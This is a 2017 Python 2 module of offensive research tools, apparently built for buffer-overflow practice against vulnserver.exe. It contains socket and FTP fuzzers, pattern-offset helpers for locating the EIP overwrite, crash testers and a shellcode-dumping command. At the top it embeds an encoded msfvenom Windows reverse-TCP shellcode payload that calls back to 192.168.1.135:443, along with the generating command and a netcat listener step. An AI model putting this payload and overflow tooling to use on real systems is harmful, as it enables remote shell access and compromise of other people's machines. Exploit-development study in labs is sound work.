"""
# Programmer: Brent E. Chambers (q0m)
# Date: 7/20/2017 -- Crazy days we live in.
# Filename: Research.py (AIC_Ops son!!) -- Support Free Info ~ AICOPSOSCPSTFIM ~ CPC Bears!
# Summary: Custom fuzzers for testing sockets and applications

 Description: Modules for performing offensive security research, in this case
 generic fuzzers whereby the classes themselves represent different scenarios
 whereby user supplied input is entered into an application, socket, or system.
 The prototype for this design began with a generic fuzzer for vulnserver.exe;
 enumerating 5-6 BOF's in a full pass, give or take a few, depending on the
 start, max, and incrementor used.

"""
import os
import string
from termcolor import colored
from sets import Set
import sys
import struct
import socket
import time


# Generic windows reverse shell, shellcode.
# CMD:  msfvenom -p windows/shell_reverse_tcp -a x86 -f python --platform windows LHOST=192.168.1.135 LPORT=443 -b "\x00\x0a\x0d" EXITFUNC=thread --smallest -e x86/fnstenv_mov
# Be sure to run an netcat listener for the callback
# $ nc -lvp 443
buf =  ""
buf += "\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += "\xf0\x28\xb5\xb6\x83\xeb\xfc\xe2\xf4\x0c\xc0\x37\xb6"
buf += "\xf0\x28\xd5\x3f\x15\x19\x75\xd2\x7b\x78\x85\x3d\xa2"
buf += "\x24\x3e\xe4\xe4\xa3\xc7\x9e\xff\x9f\xff\x90\xc1\xd7"
buf += "\x19\x8a\x91\x54\xb7\x9a\xd0\xe9\x7a\xbb\xf1\xef\x57"
buf += "\x44\xa2\x7f\x3e\xe4\xe0\xa3\xff\x8a\x7b\x64\xa4\xce"
buf += "\x13\x60\xb4\x67\xa1\xa3\xec\x96\xf1\xfb\x3e\xff\xe8"
buf += "\xcb\x8f\xff\x7b\x1c\x3e\xb7\x26\x19\x4a\x1a\x31\xe7"
buf += "\xb8\xb7\x37\x10\x55\xc3\x06\x2b\xc8\x4e\xcb\x55\x91"
buf += "\xc3\x14\x70\x3e\xee\xd4\x29\x66\xd0\x7b\x24\xfe\x3d"
buf += "\xa8\x34\xb4\x65\x7b\x2c\x3e\xb7\x20\xa1\xf1\x92\xd4"
buf += "\x73\xee\xd7\xa9\x72\xe4\x49\x10\x77\xea\xec\x7b\x3a"
buf += "\x5e\x3b\xad\x40\x86\x84\xf0\x28\xdd\xc1\x83\x1a\xea"
buf += "\xe2\x98\x64\xc2\x90\xf7\xd7\x60\x0e\x60\x29\xb5\xb6"
buf += "\xd9\xec\xe1\xe6\x98\x01\x35\xdd\xf0\xd7\x60\xe6\xa0"
buf += "\x78\xe5\xf6\xa0\x68\xe5\xde\x1a\x27\x6a\x56\x0f\xfd"
buf += "\x22\xdc\xf5\x40\x75\x1e\xf1\xaf\xdd\xb4\xf0\x29\x0e"
buf += "\x3f\x16\x42\xa5\xe0\xa7\x40\x2c\x13\x84\x49\x4a\x63"
buf += "\x75\xe8\xc1\xba\x0f\x66\xbd\xc3\x1c\x40\x45\x03\x52"
buf += "\x7e\x4a\x63\x98\x4b\xd8\xd2\xf0\xa1\x56\xe1\xa7\x7f"
buf += "\x84\x40\x9a\x3a\xec\xe0\x12\xd5\xd3\x71\xb4\x0c\x89"
buf += "\xb7\xf1\xa5\xf1\x92\xe0\xee\xb5\xf2\xa4\x78\xe3\xe0"
buf += "\xa6\x6e\xe3\xf8\xa6\x7e\xe6\xe0\x98\x51\x79\x89\x76"
buf += "\xd7\x60\x3f\x10\x66\xe3\xf0\x0f\x18\xdd\xbe\x77\x35"
buf += "\xd5\x49\x25\x93\x55\xab\xda\x22\xdd\x10\x65\x95\x28"
buf += "\x49\x25\x14\xb3\xca\xfa\xa8\x4e\x56\x85\x2d\x0e\xf1"
buf += "\xe3\x5a\xda\xdc\xf0\x7b\x4a\x63"





def remove_dupes(jaja):
	unique = Set(jaja)
	output = []
	for item in unique:
		output.append(item)
	return output

def cp_collect(): #copy and paste a list of items and it will kick it out as a unique list
        master = []
        while 1:
                host = raw_input("Command: ")
                if host == "done":
                        unique_master = remove_dupes(master)
                        return unique_master
                master.append(host)
        unique_master = remove_dupes(master)
        return unique_master



# Generic tools for BOF exploit research

def pattern_create(length):
    pattern = ''
    parts = ['A', 'a', '0']
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern


# Dump shellcode from a provided binary file  -> Payloads maybe?
def get_shellcode(path_to_file):
	cmd = "objdump -d "+ path_to_file +"|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g'"
        print cmd
        os.system(cmd)



def pattern_offset(value, buflen):
    if value.startswith('0x'):
        value = struct.pack('<I', int(value, 16)).strip('\x00')
    pattern = pattern_create(buflen)
    return pattern.index(value)

#    try:
#        return pattern.index(value)
##    except ValueError:
#        return 'Not found'


# Generic interactive socket fuzzer.
class research:
	host = ''
	port = ''
	Lookup = {}
	increment = 100
	maxlen = 21000

	def __init__(self, host, port):
		self.host = host
		self.port = port
                self.Lookup[self.host] = [[]]
		print "AIC Research Init [!] Host: " + self.host + ":" + str(self.port)


	def server_alive(self):
                d = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		d.settimeout(4)
                try:
                        d.connect((self.host, self.port))
			d.close()
			return True
                except:
                        #print "Remote service may have crashed" # with", cmd, "and a buffer length of", i
			return False


	#[+] Custom fuzzers for every 'common' occasion ;)

	def cmd_cycle(self, command, increment=100, maxlen=210000):
		cmd = command
		self.increment = increment
		self.maxlen = maxlen
		print "Initiating standard cmd cycle: INC:", self.increment, "MAX:", self.maxlen
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(4)
		try:
			s.connect((self.host, self.port))
		except:
			print "Remote service may have crashed" # with", cmd, "and a buffer length of", i
		#self.Lookup[host].extend(["Command:", cmd, "Buffer length: ", i])
		for i in range(self.increment, self.maxlen+self.increment, self.increment):
			#s.send(cmd + " " + ("A" * i))
			try:
				print "Testing %s with length %i" % (cmd, i)
				s.send(cmd + " " + ("A" * i))
				data = s.recv(1024)
			except Exception as e:
				if self.server_alive():
					s.close()
					self.cmd_cycle_resume(cmd, increment, self.maxlen+self.increment, maxlen)
				else:
					print '[!] Potential crash.  Command: ', cmd, ' Buffer:', i+self.increment
					#print data
					self.Lookup[self.host].extend(['[!] Potential service crash with command: ' + cmd + ' :: Buffer Length: ' + str(i+self.increment)])
					return


        def cmd_cycle_resume(self, command, increment=100, start=0, maxlen=210000):
                cmd = command
                self.increment = increment
                self.maxlen = maxlen
                #print "Resuming standard cmd cycle at: ", start, "INC:", self.increment, "MAX:", self.maxlen
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                try:
                        s.connect((self.host, self.port))
                except:
                        print "Remote service may have crashed" # with", cmd, "and a buffer length of", i
                #self.Lookup[host].extend(["Command:", cmd, "Buffer length: ", i])
                for i in range(start, self.maxlen+self.increment, self.increment):
                        #s.send(cmd + " " + ("A" * i))
                        try:
                                print "Testing %s with length %i" % (cmd, i)
                                s.send(cmd + " " + ("A" * i))
                                data = s.recv(1024)
                        except Exception as e:
				if self.server_alive():
					s.close()
					self.cmd_cycle_resume(cmd, increment, self.maxlen+self.increment, maxlen)
				else:
	                                print '[!] Potential crash.  Command: ', cmd, ' Buffer:', i+self.increment
	                                self.Lookup[self.host].extend(['[!] Potential service crash with command: ' + cmd + ' :: Buffer Length: ' + str(i+self.increment)])
	                                return


	def crash_test(self, command, len):
		cmd = command
		print "Testing crash: ", command, len
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(4)
		try:
			s.connect((self.host, self.port))
		except:
			print "Server unavailable."
			return
		#s.send(cmd + " " + ("A"*len))
		crash_string = pattern_create(len)
		s.send(cmd + " " + crash_string)
		data = s.recv(1024)
		print "Crash test sent."
		print "Testing server availability..."
		time.sleep(2)
		if not self.server_alive():
			print 
			print "[!] Command:       ", command
			print "[!] Buffer Length: ", len
			print "Crash test successful."
		else:
			print "Server still available."



	def crash_test_eip(self, command, length, eip_address):
		cmd = command
		eip = eip_address
		offset = str(eip).decode("hex")[::-1]
		offset_val = pattern_offset(offset, length)
		print "Testing crash...  "
		print "Command:          ", command
		print "Buffer length:    ", length
		print "EIP Crash value:  ", "0x"+str(eip)
		print "EIP offset value: ", offset
		print "EIP offset:       ", offset_val
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.host, self.port))
		offset_check_string = "A"*offset_val+"BBBB"+"C"*(length-(offset_val-4))
		#print offset_check_string
		s.send(cmd + " " + offset_check_string)
		data = s.recv(1024)
		print "EIP Crash Test sent."

	def cp_cmd_cycle(self, increment=100, maxlen=210000):
 		self.increment = increment
		self.maxlen = maxlen
		print "Initiating standard cmd cycle: INC:", self.increment, "MAX:", self.maxlen
		collect = cp_collect()
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(4)
		cmd = ''	# To address the need before a reconnect (and the while loop)
		i = ''		# As above, so below.
		for cmd in collect:
			try:
				s.connect((self.host, self.port))
			except:
				print "Remote service may have crashed" # with", cmd, "and a buffer length of", i
				#self.Lookup[host].extend(["Command:", cmd, "Buffer length: ", i])
			for i in range(self.increment, self.maxlen+self.increment, self.increment):
				#s.send(cmd + " " + ("A" * i))
				try:
					print "Testing %s with length %i" % (cmd, i)
					s.send(cmd + " " + ("A" * i))
					data = s.recv(1024)
				except Exception as e:
					print '[!] Potential crash.  Command: ', cmd, ' Buffer:', i+self.increment
					self.Lookup[self.host].extend(['[!] Potential crash.  Command: ', cmd, ' Buffer:', i+self.increment])
					#return



	def ftp_fuzzer(self, host, port):
	        import sys, socket, time

	        host = host
	        port = int(sys.argv[2]) # Recieve Port from user
	        length = 100 # Initial length of 100 A's
	        while (length < 3000): # Stop once we've tried up to 3000 length
	                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
	                client.connect((host, port)) # Connect to user supplied port and IP address
	                client.recv(1024) # Recieve FTP Banner
	                client.send("USER " + "A" * length) # Send the user command with a variable length name
	                client.recv(1024) # Recieve Reply
	                client.send("PASS pass") # Send pass to complete connection attempt (will fail)
	                client.recv(1024) # Recieve Reply
	                client.close() # Close the Connection
	                time.sleep(2) # Sleep to prevent DoS crashes
	                print "Length Sent: " + str(length) # Output the length username sent to the server
	                length += 100 # Try again with an increased length






